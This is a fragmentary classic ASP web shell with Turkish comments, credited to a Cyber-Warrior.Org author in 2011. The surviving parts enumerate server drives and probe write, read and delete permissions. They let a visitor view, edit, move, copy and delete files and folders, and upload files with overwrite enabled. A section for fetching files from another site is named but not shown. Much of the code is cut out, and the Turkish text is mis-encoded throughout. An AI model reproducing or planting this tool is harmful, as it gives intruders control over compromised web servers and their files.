...
<%
' ####
' ### Code Hunters TIM/Asi_besiktasli Tarafyndan Cyber-Warrior.Org i�in yazylmy?tyr. / 14.07.2011
...
' Sayfanyn �st�nde Sabit Duracak Olan Dizin Formu yazdyrylyyor
...
' Fso ile Serverdaki S�r�c�lere Ula?yyoruz
...
' Serverda ki Mevcut S�r�c�ler Yazdyrylyyor
...
End If
	...
	'A?a?yda �nce ge�ici bir dosya olu?turacaz olu?turabiliyor ise yazma yetkisi var yazacak. Dosyayy okuyabiliyosa okuma yetkisi var yazacak. Dosyayy silebiliyorsa silme yetkisi var yazacak.
...
' E?er 	Yazma Yetkisinde Hata verirse silme yetkisinde vermemesi i�in a?a?ydaki kodlary yazyyoruz
...
' islem De?i?kenine G�re Farkly Sayfalar �ykarylyyor
Select Case islem
Case "git"
'Dizin formu bu sayfaya yollanyyor. Bu sayfada formdan gelen bilgiye g�re kullanycyyy y�nlendiriyor
...
'�st Klas�r Varsa Link Ayarlanyyor
...
<td width="30" class="baslik">Isim</TD><td width="15%" class="baslik">Dosya Boyutu</TD><td width="25%" class="baslik">T�r</TD><td width="35%" class="baslik">Y?lem</TD>
</tr>
<%
' Dizindeki Alt Klas�rleri Yazdyryyoruz
...
' Driver �Zellikleri
Dim Drive_Type
Drive_Type = Array("Bilinmeyen","�ykarylabilir Disk","Sabit Disk","A? S�r�c�s�","CD-ROM","RAM-Disk")

Response.Write("<table><tr><td valign=""top""><br><span id=""drivers"">S�r�c�ler: </span></td>")&vbcrlf

'B�t�n Driverlery okumak i�in d�ng� kuruluyor
For Each Surucu in Suruculer
	...
	'E?er s�r�c� hazyrsa i?lemleri yap
...
'	Dosya i�eri?ini g�r�nt�leme sayfasy
	...
	Kod=""
	Else
	'Readall komutuyla dosyanyn i�eri?i okunuyor
	kod = Server.HTMLEncode(ag.ReadAll)
	End If
	
	' Readall komutuyla dosya i�eri?ini �ekince d�z yazy ?eklinde geldi?inden satyrlara b�lmek i�in split komutu ile vbcrlf karakteri g�r�len yerlerden par�alama i?lemi yapyyoruz
	icerik = Split(kod,vbcrlf)
	
	'Split ile par�alanan b�l�mleri aralaryna <br> ekleyerek satyr haline getiriyoruz
...
'---
'	Text, Asp, Php Gibi Uzantyly Yazy I�erikli Dosyalaryn I�eri?ini D�zenleyen Sayfa)
	Case "Edit"
	...
	'Dosya i�eri?ine formdan yollanan yazy yazylyyor
	...
	Kod=""
	Else
	'Dosya i�eri?i okunuyor kod de?i?kenine aktarylyyor
	Kod = Server.HTMLEncode(ag.ReadAll)
	End If
...
'Klas�r Ismi De?i?tirme Sayfasy
	Case "FolderRename"

	If Request.QueryString("action")=1 Then
	NewName=Request.Form("NewName")
	
	'Klas�r hazyr hale getiriliyor
...
'Klas�r Ta?yma Sayfasy
	Case "FolderMove"
	'Klas�r�n varly?y kontrol ediliyor
	If FSO.FolderExists(Path)=False Then
	Response.Write("<br>Klas�r Bulunamady")
	Response.End
	End If
	...
	Else
	Response.Write Path&" Klas�r�n� Ta?y<br><br><form action=""?islem=FolderMove&action=1&Path="&Path&""" method=""post""><b>Ta?ynacak Dizin: </b><input type=""text"" name=""hedef"" value="""&Dizin&""" size=50><br><input type=""submit"" value=""Ta?y"" style=""width:100px""></form>"
	End If


'Klas�r Kopyalama Sayfasy
	Case "FolderCopy"
	...
	Response.Write "Klas�r "& Hedef & " Dizinine Kopyalandy"
	Else
...
'Dosya Ta?yma Sayfasy
	...
	Response.End
	End If
	'Dosya kullanym i�in hazyr hale getiriliyor
	Set DosyaTasi = FSO.GetFile(Path)
...
'Dosya Silme Sayfasy
	...
	Else
	Response.Write("<b>"&Path&"</b><br>Dosyasyny Ger�ekten Silmek Istiyor musunuz? <a href=""?islem=FileDelete&action=1&Path="&Path&""">Sil</a> </a>")
	End If
	
'Klas�r Silme Sayfasy
	Case "FolderDelete"
	'Klas�r�n varly?y kontrol ediliyor
	If FSO.FolderExists(Path)=False Then
	Response.Write("<br>Klas�r Bulunamady")
	...
	Else
	Response.Write("<b>"&Path&"</b><br>Klas�r�n� ve I�indeki Dosyalary Ger�ekten Silmek Istiyor musunuz? <a href=""?islem=FolderDelete&action=1&Path="&Path&""">Sil</a> </a>")
	End If

' Klas�r Olu?turma Sayfasy
	Case "CreateFolder"
	If Request.QueryString("action")=1 Then
	...
	Else
	Response.Write("<form action=""?islem=CreateFolder&action=1&Path="&Path&""" method=""post"">Klas�r ady: <input type=""text"" name=""foldername""><input type=""submit"" value=""Olu?tur""></form>")
	End If
...
with oProps
	.UploadDirectory = Path ' dosyanyn y�klenece?i yer
	.AllowOverWrite = true
End with
Set oProps = Nothing
oFO.ProcessUpload
	...
	If oFO.FileCount > 0 Then
		for i = 1 to oFO.FileCount
			...
			Else
				...
				Else
					Response.Write "&gt; Dosyayy y�klerken hata olu?tu: " & _
						oFile.ErrorMessage & "<BR>"
				End If
			End If
			Set oFile = Nothing
...
'	Server'a Ba?ka Bir siteden dosya y�kleme sayfasy
Case "Dosyaindir"
...
Class FileUpload
	...
	'Class ba?latylynca �aly?acak sub
	...
	'Class biti?inde �aly?tyralacak sub
	...
	Public Sub ShowUploadForm()
		...
		With Response
		.Write("Dosyanyn Y�klenece?i Yol: "&Path&"<FORM ENCTYPE=""multipart/form-data"" ACTION=""?islem=Upload&Path="&Path&""" METHOD=""POST"">" & vbCrLf)
...
Class FO_FileChecker
	...
	'Class ba?langy�ynda �aly?tyrakacak kod
	Private Sub Class_Initialize()
		sFileName = ""
		hFileBinLen = 0
		sFileBin = ""
	...
	Public Function ValidateVerifyReturnFile()	
		If IllegalCharsFound Then
			Set ValidateVerifyReturnFile = FillFOFileObj(false, "", "", "dosya adynda ge�ersiz karakter bulunamaz", "", "", "", sFileFormInputName)
			Exit Function
		End If

		If FileNameBadOrExists Then
			Set ValidateVerifyReturnFile = FillFOFileObj(false, "", "", "bir dosya se�mediniz ya da se�ti?iniz dosya yolu yanly?; bir di?er olasylyk se�ti?iniz dosya zaten y�kl�", "", "", "", sFileFormInputName)
			Exit Function
		End If
